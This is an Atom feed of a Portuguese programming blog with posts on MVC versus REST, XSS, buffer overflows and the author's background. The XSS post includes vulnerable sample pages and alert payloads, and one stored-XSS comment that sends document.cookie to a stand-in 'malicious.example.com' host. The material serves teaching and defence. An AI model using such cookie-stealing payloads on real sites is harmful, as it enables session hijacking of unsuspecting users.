<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-03T09:42:41-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ItaloCobainsBlog</title><subtitle>Bem-vindo ao nosso blog, um espaço dedicado à exploração do fascinante mundo da programação, tecnologia, hacking ético e ciência da computação. Mergulhe conosco em uma jornada repleta de insights e novidades, enquanto compartilhamos nosso conhecimento e paixão por esses campos em constante evolução.</subtitle><entry><title type="html">Entendendo as Diferenças entre MVC e RESTful: Conceitos e Aplicações</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful.html" rel="alternate" type="text/html" title="Entendendo as Diferenças entre MVC e RESTful: Conceitos e Aplicações" /><published>2023-05-03T06:00:08-03:00</published><updated>2023-05-03T06:00:08-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful.html"><![CDATA[<p>Olá! Neste post, vamos discutir as diferenças entre os conceitos de <strong>Model-View-Controller (MVC)</strong> e <strong>RESTful</strong>. Ambos são importantes em desenvolvimento de software, especialmente no contexto de aplicações web, mas têm propósitos e funcionalidades diferentes. Vamos aprender sobre cada um deles e como eles são aplicados na prática.</p>

<h2 id="o-que-é-mvc">O que é MVC?</h2>

<p>O Model-View-Controller (MVC) é um padrão de arquitetura de software que separa a lógica de negócio, a apresentação e o controle das aplicações em três componentes distintos:</p>

<ol>
  <li><strong>Model</strong>: Representa os dados e a lógica de negócio da aplicação. É responsável por armazenar, processar e manipular os dados.</li>
  <li><strong>View</strong>: É a camada de apresentação responsável por exibir os dados ao usuário. As views recebem informações do model e as apresentam de forma visual.</li>
  <li><strong>Controller</strong>: Gerencia a comunicação entre a Model e a View. Ele recebe entradas do usuário através da View, processa as solicitações e atualiza o Model e a View de acordo.</li>
</ol>

<p>O objetivo principal do padrão MVC é separar as responsabilidades e facilitar a manutenção e escalabilidade do projeto.</p>

<h2 id="o-que-é-restful">O que é RESTful?</h2>

<p>RESTful é um conjunto de princípios e práticas para a construção de aplicações web que seguem os princípios da arquitetura REST (Representational State Transfer). As aplicações RESTful são projetadas para funcionar bem com a web, aproveitando os protocolos e convenções existentes, como HTTP e URL.</p>

<p>As principais características das aplicações RESTful incluem:</p>

<ol>
  <li><strong>Protocolo cliente-servidor</strong>: Separação das responsabilidades entre o cliente (interface do usuário) e o servidor (lógica de negócio e armazenamento de dados), permitindo que ambos evoluam de forma independente.</li>
  <li><strong>Stateless</strong>: Cada requisição do cliente para o servidor deve conter todas as informações necessárias para entender e processar a solicitação. O servidor não deve armazenar informações sobre o estado do cliente entre as solicitações.</li>
  <li><strong>Cacheable</strong>: As respostas do servidor podem ser armazenadas em cache no cliente para melhorar o desempenho e a eficiência.</li>
  <li><strong>Sistema em camadas</strong>: A arquitetura pode ser composta por várias camadas hierárquicas, com cada camada tendo uma responsabilidade específica.</li>
</ol>

<p>RESTful é frequentemente usado para criar APIs (Application Programming Interfaces) que expõem funcionalidades e dados de aplicações web de maneira padronizada e fácil de usar.</p>

<h2 id="diferenças-entre-mvc-e-restful">Diferenças entre MVC e RESTful</h2>

<p>Embora tanto o MVC quanto o RESTful sejam importantes no desenvolvimento de aplicações web, eles têm propósitos diferentes e não devem ser confundidos. Aqui estão algumas das principais diferenças:</p>

<ol>
  <li>
    <p><strong>Propósito</strong>: O MVC é um padrão de arquitetura de software que ajuda a organizar e estruturar a lógica de negócio, a apresentação e o controle da aplicação. Por outro lado, RESTful é uma abordagem para a construção de aplicações web que seguem os princípios da arquitetura REST, focando principalmente na comunicação entre cliente e servidor e na organização das APIs.</p>
  </li>
  <li>
    <p><strong>Componentes</strong>: O MVC é composto por três componentes principais: Model, View e Controller. Já as aplicações RESTful não têm uma estrutura de componentes específica; em vez disso, seguem um conjunto de princípios e práticas para a construção de aplicações web.</p>
  </li>
  <li>
    <p><strong>Aplicação</strong>: O MVC é geralmente usado no desenvolvimento de aplicações web, onde a separação de responsabilidades entre os componentes pode ajudar a simplificar e organizar o código. Por outro lado, RESTful é aplicado principalmente na construção de APIs que expõem funcionalidades e dados de aplicações web de maneira padronizada e fácil de usar.</p>
  </li>
  <li>
    <p><strong>Comunicação</strong>: O MVC lida com a comunicação entre os componentes internos da aplicação (Model, View e Controller), enquanto o RESTful foca na comunicação entre cliente e servidor através de protocolos e convenções da web, como HTTP e URL.</p>
  </li>
</ol>

<h2 id="conclusão">Conclusão</h2>

<p>MVC e RESTful são conceitos importantes no desenvolvimento de aplicações web, mas servem a propósitos diferentes e têm diferentes áreas de aplicação. O MVC é um padrão de arquitetura que ajuda a organizar o código e facilita a manutenção e escalabilidade do projeto, enquanto RESTful é uma abordagem para a construção de aplicações web e APIs que seguem os princípios da arquitetura REST.</p>

<p>Entender a diferença entre esses dois conceitos e saber como aplicá-los em seus projetos é fundamental para criar aplicações web eficientes e bem estruturadas.</p>]]></content><author><name></name></author><category term="Programação" /><category term="Arquitetura" /><category term="MVC" /><category term="RESTful" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir as diferenças entre os conceitos de Model-View-Controller (MVC) e RESTful. Ambos são importantes em desenvolvimento de software, especialmente no contexto de aplicações web, mas têm propósitos e funcionalidades diferentes. Vamos aprender sobre cada um deles e como eles são aplicados na prática.]]></summary></entry><entry><title type="html">Entendendo o XSS (Cross-Site Scripting): Conceitos e Exemplos</title><link href="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site-Scripting).html" rel="alternate" type="text/html" title="Entendendo o XSS (Cross-Site Scripting): Conceitos e Exemplos" /><published>2023-05-02T23:48:46-03:00</published><updated>2023-05-02T23:48:46-03:00</updated><id>http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site%20Scripting)</id><content type="html" xml:base="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site-Scripting).html"><![CDATA[<p>Olá! Neste post, vamos discutir o conceito de <strong>Cross-Site Scripting (XSS)</strong> e ver alguns exemplos que ilustram essa vulnerabilidade comum em aplicações web. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.</p>

<h2 id="o-que-é-xss">O que é XSS?</h2>

<p>Cross-Site Scripting (XSS) é uma vulnerabilidade de segurança que permite que um atacante injete código malicioso, geralmente scripts JavaScript, em páginas web visualizadas por outros usuários. Esses scripts podem acessar informações confidenciais, como cookies e tokens de sessão, ou até mesmo executar ações em nome da vítima.</p>

<h2 id="tipos-de-xss">Tipos de XSS</h2>

<p>Existem três tipos principais de XSS:</p>

<ol>
  <li><strong>XSS Persistente (Stored XSS)</strong>: Ocorre quando o código malicioso é armazenado permanentemente em um servidor, geralmente em bancos de dados ou arquivos. Quando outros usuários acessam a página afetada, o script é executado em seus navegadores.</li>
  <li><strong>XSS Refletido (Reflected XSS)</strong>: Ocorre quando o código malicioso é injetado por meio de parâmetros GET ou POST e é imediatamente refletido na resposta do servidor. Geralmente, o atacante induz a vítima a clicar em um link malicioso que contém o código.</li>
  <li><strong>XSS Baseado em DOM (DOM-Based XSS)</strong>: Ocorre quando o código malicioso é injetado no Document Object Model (DOM) de uma página sem a necessidade de interação com o servidor. Esse tipo de XSS explora falhas no código JavaScript do lado do cliente.</li>
</ol>

<h2 id="exemplo-de-xss-refletido">Exemplo de XSS Refletido</h2>

<p>Vamos considerar um exemplo simples de XSS Refletido:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Exemplo de XSS Refletido<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Resultado da Pesquisa:<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">let</span> <span class="nx">searchQuery</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">q</span><span class="dl">'</span><span class="p">);</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Você pesquisou: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">searchQuery</span><span class="p">;</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Neste exemplo, o script JavaScript insere o valor do parâmetro <code class="language-plaintext highlighter-rouge">q</code> diretamente no elemento HTML. Se um atacante criar um link como <code class="language-plaintext highlighter-rouge">https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, o script malicioso será executado no navegador do usuário.</p>

<h2 id="exemplo-de-xss-persistente">Exemplo de XSS Persistente</h2>

<p>Suponha que temos um fórum onde os usuários podem postar comentários. Um exemplo de XSS Persistente pode ocorrer se o aplicativo não sanitizar corretamente as entradas dos usuários antes de armazená-las no banco de dados. Um atacante pode enviar um comentário contendo um script malicioso, como:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Olá</span><span class="p">,</span> <span class="nx">pessoal</span><span class="o">!</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://malicious.example.com/steal?cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Quando outros usuários visualizarem esse comentário, o script malicioso será executado em seus navegadores, podendo roubar seus cookies e enviá-los para o site malicioso.</p>

<h2 id="exemplo-de-xss-baseado-em-dom">Exemplo de XSS Baseado em DOM</h2>

<p>Considere o seguinte exemplo de uma página que usa o DOM para exibir o resultado de uma pesquisa:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Exemplo de XSS Baseado em DOM<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Resultado da Pesquisa:<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">let</span> <span class="nx">searchQuery</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Você pesquisou: </span><span class="dl">'</span> <span class="o">+</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">searchQuery</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Neste exemplo, o script JavaScript lê o valor da pesquisa diretamente do fragmento da URL (parte após o símbolo “#”) e insere-o no elemento HTML. Se um atacante criar um link como https://example.com/search#<script>alert('XSS')</script>, o navegador da vítima executará o script malicioso ao acessar o link.</p>

<h2 id="conclusão">Conclusão</h2>

<p>O Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns em aplicações web. Para proteger seu site contra ataques de XSS, é importante seguir boas práticas de segurança, como a sanitização adequada das entradas dos usuários e a validação das entradas do lado do cliente e do servidor.</p>

<p>Também é essencial usar políticas de segurança de conteúdo (Content Security Policy - CSP) para limitar a execução de scripts de origens não confiáveis e impedir a exploração de vulnerabilidades XSS. Além disso, é importante manter-se atualizado sobre as últimas tendências e técnicas de ataque para garantir a segurança contínua de sua aplicação web.</p>

<p>Ao adotar essas práticas e conscientizar-se das diferentes formas de XSS, como XSS Persistente, XSS Refletido e XSS Baseado em DOM, você estará mais bem preparado para identificar e mitigar possíveis vulnerabilidades em seu site ou aplicação web.</p>]]></content><author><name></name></author><category term="Segurança" /><category term="Programação" /><category term="Vulnerabilidades" /><category term="XSS" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir o conceito de Cross-Site Scripting (XSS) e ver alguns exemplos que ilustram essa vulnerabilidade comum em aplicações web. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.]]></summary></entry><entry><title type="html">Entendendo o Buffer Overflow: Conceitos e Exemplos</title><link href="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow.html" rel="alternate" type="text/html" title="Entendendo o Buffer Overflow: Conceitos e Exemplos" /><published>2023-05-02T22:48:46-03:00</published><updated>2023-05-02T22:48:46-03:00</updated><id>http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow</id><content type="html" xml:base="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow.html"><![CDATA[<p>Olá! Neste post, vamos discutir o conceito de <strong>buffer overflow</strong> e ver alguns exemplos que ilustram essa vulnerabilidade comum em programas de computador. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.</p>

<h2 id="o-que-é-buffer-overflow">O que é Buffer Overflow?</h2>

<p>Buffer overflow é uma vulnerabilidade que ocorre quando um programa tenta escrever mais dados em um buffer do que ele foi projetado para armazenar. Isso pode resultar em comportamento imprevisível, como a corrupção de dados adjacentes na memória, travamento do programa ou, em casos mais sérios, a execução de código malicioso.</p>

<h2 id="por-que-isso-acontece">Por que isso acontece?</h2>

<p>Muitas vezes, buffer overflows ocorrem devido à falta de validação de entrada ou ao uso de funções inseguras que não verificam o tamanho do buffer. Linguagens de programação de baixo nível, como C e C++, são particularmente vulneráveis a buffer overflows, pois não possuem verificações automáticas de limites de buffer.</p>

<h2 id="exemplo-de-buffer-overflow">Exemplo de Buffer Overflow</h2>

<p>Vamos analisar um exemplo simples de buffer overflow em C:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Uso: %s &lt;input_string&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">vulnerable_function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Neste exemplo, a função <code class="language-plaintext highlighter-rouge">vulnerable_function</code> usa a função <code class="language-plaintext highlighter-rouge">strcpy</code> para copiar a string de entrada para um buffer de tamanho fixo. No entanto, <code class="language-plaintext highlighter-rouge">strcpy</code> não verifica o tamanho do buffer e pode causar um overflow se a string de entrada for maior que o tamanho do buffer.</p>

<h2 id="como-explorar-e-evitar-buffer-overflows">Como explorar e evitar Buffer Overflows</h2>

<p>Os atacantes podem explorar buffer overflows para injetar e executar código malicioso, causar a negação de serviço ou ganhar acesso não autorizado a sistemas. Existem várias técnicas para explorar buffer overflows, como o <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">Return-to-libc</a> e o <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP (Return-oriented programming)</a>.</p>

<p>Para evitar buffer overflows, os desenvolvedores podem adotar as seguintes práticas:</p>

<ol>
  <li><strong>Validar a entrada do usuário</strong>: Sempre valide o tamanho e o conteúdo das entradas do usuário antes de processá-las.</li>
  <li><strong>Usar funções seguras</strong>: Evite usar funções inseguras que não verificam o tamanho do buffer, como <code class="language-plaintext highlighter-rouge">strcpy</code>, <code class="language-plaintext highlighter-rouge">gets</code> e <code class="language-plaintext highlighter-rouge">sprintf</code>. Em vez disso, use funções seguras, como <code class="language-plaintext highlighter-rouge">strncpy</code>, <code class="language-plaintext highlighter-rouge">fgets</code> e <code class="language-plaintext highlighter-rouge">snprintf</code>.</li>
  <li><strong>Habilitar proteções de compilador</strong>: Ative proteções como <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR (Address Space Layout Randomization)</a> e <a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP (Data Execution Prevention)</a> para dificultar a exploração de buffer overflows.</li>
</ol>

<p>Espero que este post tenha ajudado a entender melhor o conceito de buffer overflow, suas causas e como evitá-lo. Ao seguir as práticas recomendadas, você pode minimizar as chances de introduzir vulnerabilidades de buffer overflow em seu código e proteger seus programas contra ataques maliciosos.</p>]]></content><author><name></name></author><category term="Segurança" /><category term="Programação" /><category term="Vulnerabilidades" /><category term="BufferOverflow" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir o conceito de buffer overflow e ver alguns exemplos que ilustram essa vulnerabilidade comum em programas de computador. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.]]></summary></entry><entry><title type="html">Bem vindo ao blog do ItaloCobains</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains.html" rel="alternate" type="text/html" title="Bem vindo ao blog do ItaloCobains" /><published>2023-05-02T21:48:46-03:00</published><updated>2023-05-02T21:48:46-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains.html"><![CDATA[<p>Olá! Meu nome é <strong>Italo Brito Brandão</strong>, mas sou mais conhecido na comunidade como <em>ItaloCobains</em>. Comecei a aprender a programar aos 16 anos, usando o Visualg. Sempre gostei de criar algoritmos e enfrentar desafios. Depois de um tempo, comecei a aprender sobre desenvolvimento web, estudando HTML e CSS, o que me proporcionou uma base sólida para aprender frameworks mais adiante.</p>

<p>Embora o próximo passo lógico fosse aprender JavaScript, decidi mudar um pouco e aprender uma linguagem de programação consolidada: Python. Após um ano programando em Python, busquei algo mais desafiador e mergulhei no mundo da linguagem C. Foi um processo difícil, e cheguei a odiar a linguagem C por um tempo. No entanto, conforme fui aprendendo mais sobre ciência da computação, a linguagem C começou a fazer sentido para mim.</p>

<p>Com o tempo, voltei para o desenvolvimento web e finalmente aprendi JavaScript. Assim, fui me aprofundando em frameworks e bibliotecas como React, Next.js e outros, tornando-me um desenvolvedor Full Stack. Depois de dominar o desenvolvimento web, retomei o estudo de programação de baixo nível.</p>

<p>Li livros como <em>“Programação em Baixo Nível: C, Assembly e Execução de Programas na Arquitetura Intel 64”</em> de Igor Zhirkov e <em>“Código Limpo”</em>, muito conhecido na comunidade. Ao mesmo tempo, comecei a estudar processos de memória e, como teste, hackeava a memória de jogos antigos para entender como ela funcionava e como os desenvolvedores de jogos organizavam a memória.</p>

<p>Atualmente, trabalho em um projeto open source de uma linguagem de programação em português chamada <a href="https://github.com/DesignLiquido/delegua">Delegua</a> e desenvolvo softwares para empresas da minha cidade. Eu amo programar e estou animado para compartilhar minha jornada e conhecimento neste blog!</p>]]></content><author><name></name></author><category term="Programação" /><category term="Inicio" /><category term="Web" /><category term="Baixo" /><category term="Nivel" /><summary type="html"><![CDATA[Olá! Meu nome é Italo Brito Brandão, mas sou mais conhecido na comunidade como ItaloCobains. Comecei a aprender a programar aos 16 anos, usando o Visualg. Sempre gostei de criar algoritmos e enfrentar desafios. Depois de um tempo, comecei a aprender sobre desenvolvimento web, estudando HTML e CSS, o que me proporcionou uma base sólida para aprender frameworks mais adiante.]]></summary></entry></feed>